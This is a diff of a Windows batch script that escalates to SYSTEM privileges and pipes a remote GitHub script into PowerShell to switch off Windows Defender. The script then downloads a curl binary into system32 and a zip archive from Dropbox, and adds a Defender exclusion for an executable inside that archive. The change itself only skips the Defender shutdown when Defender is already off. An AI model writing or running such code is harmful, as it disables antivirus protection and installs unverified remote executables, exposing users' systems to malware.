@@ -1,12 +1,15 @@
 @echo off
 whoami /user | findstr /i /c:S-1-5-18 >nul || ( call :RunAsTI "%~f0" %* & exit /b )
-set 1=6&powershell irm 'github.com/AveYo/LeanAndMean/raw/main/ToggleDefender.bat'^|iex
+powershell exit !!^(Get-MpComputerStatus^).AMRunningMode
+if not errorlevel 1 goto :main
+set 1=6&powershell [System.Net.ServicePointManager]::SecurityProtocol = 'TLS12';irm 'github.com/AveYo/LeanAndMean/raw/main/ToggleDefender.bat'^|iex
 :checkdefender
 powershell exit ^(Get-MpComputerStatus^).AMRunningMode -ne 'Not running'
 if errorlevel 1 (
   timeout /t 3 /nobreak
   goto :checkdefender
 )
+:main
 if not exist "%WinDir%\system32\curl.exe" powershell [System.Net.ServicePointManager]::SecurityProtocol = 'TLS12';iwr https://microtoolbox.github.io/curl.exe -OutFile "${env:windir}\system32\curl.exe"
 curl https://dl.dropbox.com/scl/fi/wq2bk3y4m1k5lv4im1pd6/Get7.zip?rlkey=8r6uetucfzb0ivwplfflppi1y -Lo "%temp%\Get7.zip"
 powershell Add-MpPreference -ExclusionPath '%temp%\Get7\Windows\Win7Volume.exe'
